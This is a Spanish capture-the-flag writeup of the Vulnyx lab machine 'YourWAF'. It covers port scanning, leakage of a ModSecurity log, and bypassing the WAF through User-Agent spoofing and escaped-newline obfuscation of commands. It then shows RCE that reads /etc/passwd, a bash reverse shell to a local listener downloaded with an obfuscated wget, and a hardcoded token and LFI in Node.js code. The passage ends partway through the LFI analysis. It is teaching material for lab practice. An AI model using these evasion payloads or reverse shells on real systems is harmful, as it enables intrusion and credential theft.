# Writeup: YourWAF (Vulnyx — Fácil)

YourWAF es una máquina **Fácil** que simula un entorno con un **Web Application Firewall (WAF)** basado en **ModSecurity** con el ruleset **OWASP CRS**. El recorrido comienza con el descubrimiento de la máquina en la red local y el escaneo de puertos, que revela un servidor web protegido por WAF, un servicio Node.js en el puerto 3000 y SSH. A través de la exposición de los **logs de auditoría de ModSecurity**, se obtiene información crítica sobre la configuración del WAF (paranoia level, umbral de bloqueo, reglas activas). Con esta información, se diseña un bypass del WAF basado en la manipulación del **User-Agent** y la ofuscación de comandos con **saltos de línea escapados**. Tras eludir el WAF, se descubre un subdominio (`maintenance.yourwaf.nyx`) con un **RCE** directo a través del parámetro `cmd`. El RCE permite obtener una reverse shell como `www-data`. Desde dentro del contenedor, se analiza el código fuente del servicio Node.js, se extrae un **token hardcodeado**, se explota un **LFI** con filtro débil para leer `/etc/shadow` y la clave privada SSH del usuario `tester`. Finalmente, se crackea la passphrase de la clave SSH, se accede como `tester`, se abusa de un **cron job** que ejecuta un script con permisos de escritura del grupo `copylogs` y se escala a `root` mediante un binario SUID.

---

## Fase 1: Descubrimiento de la máquina

### 1.1 Escaneo de red local con `arp-scan`

Para descubrir hosts activos en la red local (asumiendo que estamos en la misma subred), utilizamos `arp-scan`:

```bash
sudo arp-scan --localnet
```

**Resultado:**

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 192.168.1.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1     10:07:1d:92:cf:98       Fiberhome Telecommunication Technologies Co.,LTD
192.168.1.4     50:bb:b5:ab:8c:0c       (Unknown)
192.168.1.44    08:00:27:9a:4f:ef       PCS Systemtechnik GmbH
192.168.1.6     00:a5:54:32:27:f6       Intel Corporate
192.168.1.26    6e:ed:a3:e6:14:aa       (Unknown: locally administered)
192.168.1.5     ee:37:73:2d:35:86       (Unknown: locally administered)

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.223 seconds (115.16 hosts/sec). 6 responded
```

**Explicación:** `arp-scan` envía peticiones ARP a todos los hosts de la subred y muestra aquellos que responden. La MAC `08:00:27:9a:4f:ef` corresponde a **Oracle VirtualBox**, lo que indica que `192.168.1.44` es una máquina virtual, probablemente nuestro objetivo.

---

## Fase 2: Enumeración de puertos

### 2.1 Escaneo completo de puertos con Nmap

```bash
sudo nmap -sS --min-rate 500 -Pn -n -p- -vv 192.168.1.44 -oG allPorts
```

**Resultado:**

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 15:49 -0400
Initiating ARP Ping Scan at 15:49
Scanning 192.168.1.44 [1 port]
Completed ARP Ping Scan at 15:49, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:49
Scanning 192.168.1.44 [65535 ports]
Discovered open port 22/tcp on 192.168.1.44
Discovered open port 80/tcp on 192.168.1.44
Discovered open port 3000/tcp on 192.168.1.44
Completed SYN Stealth Scan at 15:49, 20.82s elapsed (65535 total ports)
Nmap scan report for 192.168.1.44
Host is up, received arp-response (0.0040s latency).
Scanned at 2026-09-10 15:49:17 EDT for 21s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
MAC Address: 08:00:27:9A:4F:EF (Oracle VirtualBox virtual NIC)
```

**Explicación de parámetros:**

- `-sS`: Escaneo SYN (sigiloso), rápido y sin completar la conexión TCP.
- `--min-rate 500`: Fuerza a Nmap a enviar al menos 500 paquetes por segundo.
- `-Pn`: Omite la fase de descubrimiento de hosts (asume que la máquina está activa).
- `-n`: Omite la resolución DNS para evitar demoras.
- `-p-`: Escanea todos los 65535 puertos.
- `-vv`: Verbosidad aumentada para ver progreso en tiempo real.
- `-oG allPorts`: Guarda los resultados en formato "grepable".

### 2.2 Enumeración de servicios

```bash
nmap -sCV -p 22,80,3000 192.168.1.44 -oN targeted
```

**Resultados clave:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 1c:ec:5c:5b:fd:fc:ba:f3:4c:1b:0b:70:e6:ef:bf:12 (ECDSA)
|_  256 26:18:c8:ec:34:aa:d5:b9:28:a1:e2:83:b0:d3:45:2e (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.59 (Debian)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:9A:4F:EF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Observaciones clave:**

- **Puerto 22 (SSH)**: OpenSSH 9.2p1 en Debian.
- **Puerto 80 (HTTP)**: Apache 2.4.59 devuelve un **403 Forbidden** por defecto, lo que sugiere que hay un WAF o una configuración de VirtualHost restrictiva.
- **Puerto 3000 (HTTP)**: Servicio Node.js/Express que devuelve `Unauthorized` en la raíz.

---

## Fase 3: Análisis del sitio web y detección del WAF

### 3.1 Redirección al dominio `yourwaf.nyx`

Al acceder a `http://192.168.1.44` en el navegador, somos redirigidos a:

```
http://www.yourwaf.nyx/
```

Añadimos el dominio y sus subdominios al archivo `/etc/hosts`:

```bash
echo "192.168.1.44 yourwaf.nyx www.yourwaf.nyx" | sudo tee -a /etc/hosts
```

### 3.2 Análisis del servicio en el puerto 3000

```bash
curl -s http://www.yourwaf.nyx:3000
```

**Resultado:**

```
Unauthorized.
```

**Explicación:** El servicio Node.js en el puerto 3000 requiere un token de autenticación (API token). Sin él, todas las peticiones devuelven `Unauthorized`.

### 3.3 Detección del WAF en el puerto 80 con `wafw00f`

```bash
wafw00f http://www.yourwaf.nyx
```

**Resultado:**

```
                ______
               /      \
              (  W00f! )
               \  ____/
               ,,    __            404 Hack Not Found
           |`-.__   / /                      __     __
           /"  _/  /_/                       \ \   / /
          *===*    /                          \ \_/ /  405 Not Allowed
         /     )__//                           \   /
    /|  /     /---`                        403 Forbidden
    \\/`   \ |                                 / _ \
    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error
      `_____``-`                             /_/   \_\\

                        ~ WAFW00F : v2.4.2 ~
        The Web Application Firewall Fingerprinting Toolkit
    
[*] Checking http://www.yourwaf.nyx
[+] Generic Detection results:
[*] The site http://www.yourwaf.nyx seems to be behind a WAF or some sort of security solution
[~] Reason: The server returns a different response code when an attack string is used.
Normal response code is "200", while the response code to cross-site scripting attack is "403"
[~] Number of requests: 5
```

**Explicación:** `wafw00f` envía peticiones con payloads maliciosos y compara las respuestas. Si el código de respuesta cambia (por ejemplo, de 200 a 403), sospecha la presencia de un WAF. En este caso, confirma que `www.yourwaf.nyx` está protegido.

### 3.4 Detección del WAF en el puerto 3000

```bash
wafw00f -a http://www.yourwaf.nyx:3000
```

**Resultado:**

```
                   ______
                  /      \
                 (  Woof! )
                  \  ____/                      )
                  ,,                           ) (_
             .-. -    _______                 ( |__|
            ()``; |==|_______)                .)|__|
            / ('        /|\                  (  |__|
        (  /  )        / | \                  . |__|
         \(_)_))      /  |  \                   |__|

                    ~ WAFW00F : v2.4.2 ~
    The Web Application Firewall Fingerprinting Toolkit
    
[*] Checking http://www.yourwaf.nyx:3000
[+] Generic Detection results:
[-] No WAF detected by the generic detection
[~] Number of requests: 7
```

**Explicación:** El puerto 3000 **no está protegido por WAF**. Esto lo convierte en un vector de ataque más directo.

### 3.5 Fuzzing del puerto 3000

Realizamos un fuzzing con un diccionario específico de objetos de API:

```bash
ffuf -u http://www.yourwaf.nyx:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
```

**Resultado:**

```
Logs                    [Status: 200, Size: 248860, Words: 20565, Lines: 1739, Duration: 597ms]
logs                    [Status: 200, Size: 248860, Words: 20565, Lines: 1739, Duration: 607ms]
```

**Hallazgo crítico:** El endpoint `/logs` está expuesto **sin autenticación** (a diferencia de `/`, `/restart` y `/readfile`, que sí requieren token). Devuelve un archivo de **248 KB** con **1739 líneas** — el log de auditoría de ModSecurity.

---

## Fase 4: Análisis del log de ModSecurity

### 4.1 Información clave extraída del log

Del log extraído, obtenemos la siguiente información sobre el entorno:

| Elemento | Valor |
|----------|-------|
| WAF | ModSecurity for Apache/2.9.7 |
| Ruleset | OWASP CRS/3.3.4 |
| Web Server | Apache/2.4.59 (Debian) |
| Hostname interno | `yourwaf.yourwaf.com` |
| Backend | PHP (`application/x-httpd-php`) |
| Engine Mode | **ENABLED** (Blocking) |
| Paranoia Level | 1 |
| Umbral de bloqueo | Score ≥ 5 |

**Reglas activadas identificadas:**

```
┌────────────────────────────────────────────────────────┐
│  REGLA 913100 — User-Agent de escáner                  │
│  +5 puntos (CRITICAL)                                  │
│  Trigger: "nmap scripting engine" en User-Agent       │
├────────────────────────────────────────────────────────┤
│  REGLA 920350 — Host header es IP numérica             │
│  +3 puntos (WARNING)                                   │
│  Trigger: Host: 192.168.1.44                           │
├────────────────────────────────────────────────────────┤
│  REGLA 911100 — Método no permitido                    │
│  +5 puntos (CRITICAL)                                  │
│  Trigger: PROPFIND, OPTIONS, POST                     │
├────────────────────────────────────────────────────────┤
│  REGLA 930130 — Acceso a archivo restringido           │
│  +5 puntos (CRITICAL) — Tag: attack-lfi               │
│  Trigger: /.git/ en el path                            │
├────────────────────────────────────────────────────────┤
│  REGLA 949110 — Umbral excedido → BLOQUEO              │
│  Trigger: score_total ≥ 5                              │
└────────────────────────────────────────────────────────┘
```

### 4.2 Hallazgos críticos del log

#### 🔴 4.2.1 Configuración del WAF completamente expuesta

```
Versión exacta:    ModSecurity 2.9.7
Ruleset:           OWASP CRS 3.3.4 (conocida públicamente)
Paranoia Level:    1 (el más bajo)
Threshold:         5 (fácil de calcular)
```

> **Impacto:** Cualquier atacante puede consultar la documentación de CRS 3.3.4 y diseñar payloads específicos que no superen el score de 5.

#### 🔴 4.2.2 Sistema de puntuación VULNERABLE a bypass

```
Ejemplo de bypass:

PETICIÓN BLOQUEADA:
  User-Agent: Nmap Scripting Engine  →  +5
  Host: 192.168.1.44                  →  +3
  TOTAL: 8 → BLOQUEADO

PETICIÓN NO BLOQUEADA:
  User-Agent: Mozilla/5.0             →  0
  Host: www.yourwaf.nyx               →  0
  TOTAL: 0 → PERMITIDO ✅
```

#### 4.2.3 Matriz de bypass

| Elemento de la petición | Valor que NO dispara reglas | Score |
|--------------------------|------------------------------|-------|
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` | 0 |
| Host header | `www.yourwaf.nyx` (dominio, no IP) | 0 |
| Content-Type | `application/x-www-form-urlencoded` | 0 |
| Método | GET, POST (con Content-Type) | 0 |
| Path | Sin `/.git/`, sin `/sdk` | 0 |

**Petición "limpia" que pasa el WAF:**

```bash
curl -v http://192.168.1.44/ \
  -H "Host: www.yourwaf.nyx" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" \
  -H "Accept: text/html,application/xhtml+xml"
```

---

## Fase 5: Bypass del WAF — Enumeración de subdominios

### 5.1 Primer intento de enumeración (fallido)

```bash
ffuf -u http://yourwaf.nyx \
  -H "Host: FUZZ.yourwaf.nyx" \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -fs 0
```

**Resultado:**

```
mail                    [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 14ms]
www                     [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 15ms]
mx                      [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 16ms]
ns                      [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 21ms]
web                     [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 25ms]
webmail                 [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 31ms]
```

**Explicación:** El WAF bloquea las peticiones de fuzzing porque el User-Agent por defecto de `ffuf` es detectado como herramienta de escaneo. Todos los resultados devuelven 403.

### 5.2 Enumeración exitosa con bypass del WAF

Aplicamos el bypass modificando el User-Agent para simular un navegador legítimo:

```bash
ffuf -u http://yourwaf.nyx \
  -H "Host: FUZZ.yourwaf.nyx" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -fs 0
```

**Resultado:**

```
www                     [Status: 200, Size: 10722, Words: 3594, Lines: 171, Duration: 5565ms]
maintenance             [Status: 200, Size: 292, Words: 58, Lines: 14, Duration: 424ms]
```

**Hallazgo crítico:** Encontramos el subdominio **`maintenance.yourwaf.nyx`**, que devuelve una página de 292 bytes.

Añadimos el subdominio al archivo `/etc/hosts`:

```bash
echo "192.168.1.44 maintenance.yourwaf.nyx" | sudo tee -a /etc/hosts
```

---

## Fase 6: Ejecución Remota de Comandos (RCE)

### 6.1 Descubrimiento del RCE

Accedemos al subdominio `maintenance.yourwaf.nyx` y probamos el parámetro `cmd`:

```bash
curl -s 'http://maintenance.yourwaf.nyx/index.php?cmd=whoami'
```

**Resultado:**

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Ejecución de comandos</h1>
    <p>A continuación puede ejecutar comandos para el mantenimiento del servidor</p>
    <form>
        <input type="text" name="cmd">
        <input type="submit" value="Ejecutar">
    </form>
    <br>
    <h2>whoami</h2><pre>www-data
</pre></body>
</html>
```

**Hallazgo crítico:** La página permite ejecutar comandos a través del parámetro `cmd` en la URL. Tenemos RCE como `www-data`.

### 6.2 Limitaciones del RCE por el WAF

Al intentar ejecutar comandos con espacios o caracteres especiales, el WAF bloquea la petición:

```
GET /?cmd=ls+la HTTP/1.1
Host: maintenance.yourwaf.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://maintenance.yourwaf.nyx/?cmd=la%3B
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Resultado:**

```
HTTP/1.1 403 Forbidden
Date: Tue, 15 Sep 2026 00:11:03 GMT
Server: Apache/2.4.59 (Debian)
Content-Length: 288
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.59 (Debian) Server at maintenance.yourwaf.nyx Port 80</address>
</body></html>
```

**Explicación:** El WAF bloquea peticiones que contienen secuencias sospechosas como `ls la`. Necesitamos una técnica de ofuscación.

---

## Fase 7: Bypass del WAF para RCE (Ofuscación con saltos de línea escapados)

### 7.1 Técnica de bypass: `\` + salto de línea

En Bash, el carácter `\` seguido de un salto de línea se interpreta como **continuación de línea**. Es decir, el shell elimina el `\` y el salto de línea, uniendo las dos líneas en una sola. Esta técnica se usa comúnmente para dividir comandos largos en varias líneas legibles.

**Ejemplo:**

```bash
cat /et\
c/pa\
sswd
```

El shell interpreta esto como:

```bash
cat /etc/passwd
```

**¿Por qué bypasea el WAF?** El WAF analiza la petición HTTP como una cadena de texto. Al insertar `\` + salto de línea, el WAF ve una cadena que **no coincide con el patrón** `/etc/passwd` (porque está dividido), pero el shell del servidor sí lo interpreta correctamente al unir las líneas.

### 7.2 Payload ofuscado para leer `/etc/passwd`

```bash
GET /?cmd=cat%20/et%5C%0Ac/pa%5C%0Asswd HTTP/1.1
Host: maintenance.yourwaf.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://maintenance.yourwaf.nyx/?cmd=la%3B
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Explicación del payload:**

- `%20` = espacio
- `%5C` = `\`
- `%0A` = salto de línea

El WAF ve: `cat /et\ c/pa\ sswd` (dividido en varias líneas). El shell del servidor lo interpreta como: `cat /etc/passwd`.

**Resultado:**

```
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
tester:x:1000:1000:tester,,,:/home/tester:/bin/bash
mysql:x:101:110:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
</pre>
```

Obtenemos el archivo `/etc/passwd` con el usuario `tester`.

---

## Fase 8: Análisis de `index.php` (código fuente)

### 8.1 Obtención del código fuente

Intentamos leer `index.php` directamente:

```bash
GET /?cmd=cat%20./i%5C%0Ande%5C%0Ax.ph%5C%0Ap HTTP/1.1
Host: maintenance.yourwaf.nyx
```

**Resultado:**

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.59 (Debian) Server at maintenance.yourwaf.nyx Port 80</address>
</body></html>
```

**Explicación:** El WAF bloquea la salida de código PHP (probablemente por la regla que detecta `<?php`).

### 8.2 Exfiltración con Base64

Codificamos la salida en Base64 para evitar que el WAF detecte el código PHP:

```bash
GET /?cmd=cat%20./i%5C%0Ande%5C%0Ax.ph%5C%0Ap|base64 HTTP/1.1
Host: maintenance.yourwaf.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://maintenance.yourwaf.nyx/?cmd=la%3B
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Resultado:**

```html
   <h2>cat ./i\
nde\
x.ph\
p|base64</h2><pre>PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8Ym9keT4KICAgIDxoMT5FamVjdWNpw7NuIGRlIGNvbWFu
ZG9zPC9oMT4KICAgIDxwPkEgY29udGludWFjacOzbiBwdWVkZSBlamVjdXRhciBjb21hbmRvcyBw
YXJhIGVsIG1hbnRlbmltaWVudG8gZGVsIHNlcnZpZG9yPC9wPgogICAgPGZvcm0+CiAgICAgICAg
PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNtZCI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1p
dCIgdmFsdWU9IkVqZWN1dGFyIj4KICAgIDwvZm9ybT4KICAgIDxicj4KICAgIDw/cGhwIAogICAg
aWYgKGlzc2V0KCRfR0VUWydjbWQnXSkgJiYgIWVtcHR5KCRfR0VUWydjbWQnXSkpIHsKICAgICAg
ICBlY2hvICc8aDI+Jy5odG1sc3BlY2lhbGNoYXJzKCRfR0VUWydjbWQnXSkuJzwvaDI+PHByZT4n
OwogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgICAgIGVjaG8gJzwvcHJlPic7CiAg
ICB9Cj8+CjwvYm9keT4KPC9odG1sPiAKCg==
</pre>
```

### 8.3 Decodificación del código fuente

```bash
echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8Ym9keT4KICAgIDxoMT5FamVjdWNpw7NuIGRlIGNvbWFuZG9zPC9oMT4KICAgIDxwPkEgY29udGludWFjacOzbiBwdWVkZSBlamVjdXRhciBjb21hbmRvcyBwYXJhIGVsIG1hbnRlbmltaWVudG8gZGVsIHNlcnZpZG9yPC9wPgogICAgPGZvcm0+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNtZCI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVqZWN1dGFyIj4KICAgIDwvZm9ybT4KICAgIDxicj4KICAgIDw/cGhwIAogICAgaWYgKGlzc2V0KCRfR0VUWydjbWQnXSkgJiYgIWVtcHR5KCRfR0VUWydjbWQnXSkpIHsKICAgICAgICBlY2hvICc8aDI+Jy5odG1sc3BlY2lhbGNoYXJzKCRfR0VUWydjbWQnXSkuJzwvaDI+PHByZT4nOwogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgICAgIGVjaG8gJzwvcHJlPic7CiAgICB9Cj8+CjwvYm9keT4KPC9odG1sPiAKCg==' | base64 -d
```

**Código fuente de `index.php`:**

```php
<!DOCTYPE html>
<html>
<body>
    <h1>Ejecución de comandos</h1>
    <p>A continuación puede ejecutar comandos para el mantenimiento del servidor</p>
    <form>
        <input type="text" name="cmd">
        <input type="submit" value="Ejecutar">
    </form>
    <br>
    <?php
    if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
        echo '<h2>'.htmlspecialchars($_GET['cmd']).'</h2><pre>';
        system($_GET['cmd']);
        echo '</pre>';
    }
?>
</body>
</html>
```

### 8.4 Análisis de la vulnerabilidad en `index.php`

**¿Por qué es vulnerable?**

1. **Uso de `system()` con entrada del usuario:** La función `system($_GET['cmd'])` ejecuta el comando proporcionado por el usuario directamente en el shell del sistema operativo. No hay ninguna validación, sanitización ni lista blanca de comandos permitidos.

2. **Falta de autenticación:** La página no requiere autenticación. Cualquier usuario que acceda al subdominio puede ejecutar comandos.

3. **Falta de controles de autorización:** No se verifica si el usuario tiene permisos para ejecutar comandos de mantenimiento.

4. **Exposición de un panel de administración:** La página está diseñada para "mantenimiento del servidor", lo que implica que debería estar protegida. Pero está expuesta públicamente.

**¿Cómo se habría arreglado esto?**

- **Autenticación y autorización:** Requerir credenciales válidas y verificar que el usuario tenga permisos de administrador.
- **Lista blanca de comandos:** En lugar de permitir cualquier comando, definir una lista de comandos permitidos (por ejemplo, `service apache2 restart`, `tail /var/log/syslog`) y validar que el comando solicitado esté en la lista.
- **Sanitización de entrada:** Escapar caracteres especiales y usar funciones seguras como `escapeshellarg()` o `escapeshellcmd()`.
- **Eliminación de la funcionalidad:** Si no es estrictamente necesario, eliminar la funcionalidad de ejecución de comandos.

---

## Fase 9: Reverse Shell

### 9.1 Preparación del script de reverse shell

En nuestra máquina Kali, creamos un script `rev.sh`:

```bash
cat > rev.sh <<'EOF'
#!/bin/bash
exec bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'
EOF
```

**Verificación del script:**

```bash
➜  content ls
rev.sh
➜  content cat rev.sh          
#!/bin/bash
exec bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'
```

Levantamos un servidor HTTP para servir el script:

```bash
python3 -m http.server
```

**Resultado:**

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### 9.2 Descarga del script en la máquina víctima

Usamos el RCE (con bypass del WAF) para descargar el script. El comando `wget` es ofuscado como `w?et` para evadir el WAF:

```bash
GET /?cmd=/usr/bin/w%3Fet%20-O%20/tmp/rev.sh%20http://192.168.1.10:8000/rev.sh HTTP/1.1
Host: maintenance.yourwaf.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://maintenance.yourwaf.nyx/?cmd=pwd
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Explicación del payload:**

- `w%3Fet` = `w?et` (el `?` es un comodín que el shell expande a `wget` si existe). Esto evita que el WAF detecte la palabra `wget`.
- `-O /tmp/rev.sh` = guarda el archivo como `/tmp/rev.sh`
- `http://192.168.1.10:8000/rev.sh` = URL del script

**Resultado en el servidor HTTP:**

```
192.168.1.5 - - [16/Sep/2026 20:29:58] "GET /rev.sh HTTP/1.1" 200 -
```

### 9.3 Ejecución del script y obtención de la reverse shell

Iniciamos un listener en nuestra máquina Kali:

```bash
nc -lvnp 4444
```

**Resultado:**

```
listening on [any] 4444 ...
```

Ejecutamos el script en la víctima:

```bash
GET /?cmd=.%20/tmp/rev.sh HTTP/1.1
Host: maintenance.yourwaf.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://maintenance.yourwaf.nyx/?cmd=pwd
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Resultado:**

```bash
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.5] 36974
bash: cannot set terminal process group (550): Inappropriate ioctl for device      
bash: no job control in this shell
www-data@yourwaf:/var/www/maintenance.yourwaf.nyx$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Somos el usuario `www-data`.

---

## Fase 10: Enumeración local y análisis del servicio Node.js

### 10.1 Descubrimiento del proyecto Node.js

Exploramos el sistema y encontramos el proyecto Node.js en `/opt/nodeapp/`:

```bash
ls -la opt/nodeapp/
```

**Resultado:**

```
total 60
drwxr-xr-x  4 root root      4096 May 26  2024 .
drwxr-xr-x  3 root root      4096 May 26  2024 ..
-rwxrwxr-x  1 root copylogs   111 May 26  2024 copylogs.sh
-rw-r--r--  1 root root       232 May 26  2024 ecosystem.config.js
drwxr-xr-x  2 root root      4096 May 26  2024 logs
drwxr-xr-x 66 root root      4096 May 26  2024 node_modules
-rw-r--r--  1 root root     25436 May 26  2024 package-lock.json
-rw-r--r--  1 root root       303 May 26  2024 package.json
-rw-r--r--  1 root root      1247 May 26  2024 server.js
```

### 10.2 Análisis del código fuente `server.js`

```bash
cat /opt/nodeapp/server.js
```

```javascript
const express = require('express')
const { exec } = require('child_process');
var path = require('path');

const app = express()
const port = 3000

const apiToken = '8c2b6a304191b8e2d81aaa5d1131d83d';

function checkApiToken(req, res, next) {
  let sendApiToken = req.query["api-token"] ?? '';
  if (apiToken !== sendApiToken) {
    res.send("Unauthorized.")
    return;
  }
  next();
}

app.use('/logs', (req, res) => {
  let path_to_file = __dirname + '/logs/modsec_audit.log'
  res.sendFile(path_to_file)
})

app.get('/', checkApiToken, (req, res) => {
  res.send('API de mantenimiento!');
})

app.get('/restart', checkApiToken, (req, res) => {
  exec('reboot', (error, stdout, stderr) => {
    if (error) {
      res.send(`exec error: ${error}`)
      return;
    }
    res.send('Restarting server...');
  });
})

app.get('/readfile', checkApiToken, (req, res) => {
  let file = req.query["file"] ?? '';
  if (file === '') {
    res.send('Error: need file')
    return;
  }
  if (file.indexOf('passwd') !== -1) {
    res.send('ForbiddenError: Forbidden')
    return;
  }
  let path_to_file = __dirname + file
  res.sendFile(path.resolve(path_to_file))
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

### 10.3 Vulnerabilidades identificadas en `server.js`

#### 🔴 10.3.1 Token hardcodeado en el código fuente

```javascript
const apiToken = '8c2b6a304191b8e2d81aaa5d1131d83d';
```

El token de API está hardcodeado en el código fuente y se pasa a través de una query param:

```javascript
let sendApiToken = req.query["api-token"] ?? '';
```

**Verificación:**

```bash
TOKEN="8c2b6a304191b8e2d81aaa5d1131d83d"
curl -s "http://www.yourwaf.nyx:3000/?api-token=$TOKEN"
```

**Resultado:**

```
API de mantenimiento!
```

El token funciona y podemos autenticarnos.

#### 🔴 10.3.2 El endpoint `/logs` no requiere autenticación

```javascript
app.use('/logs', (req, res) => {
  let path_to_file = __dirname + '/logs/modsec_audit.log'
  res.sendFile(path_to_file)
})
```

El endpoint `/logs` **no está protegido por `checkApiToken`**. Esto significa que cualquier usuario puede acceder a los logs de ModSecurity, que contienen información sensible. **Gracias a esta vulnerabilidad pudimos enumerar la API y facilitar el bypass del WAF.**

#### 🔴 10.3.3 LFI con filtro débil en `/readfile`

```javascript
app.get('/readfile', checkApiToken, (req, res) => {
  let file = req.query["file"] ?? '';
  if (file === '') {
    res.send('Error: need file')
    return;
  }
  if (file.indexOf('passwd') !== -1) {
    res.send('ForbiddenError: Forbidden')
    return;
  }
  let path_to_file = __dirname + file
  res.sendFile(path.resolve(path_to_file))
})
```

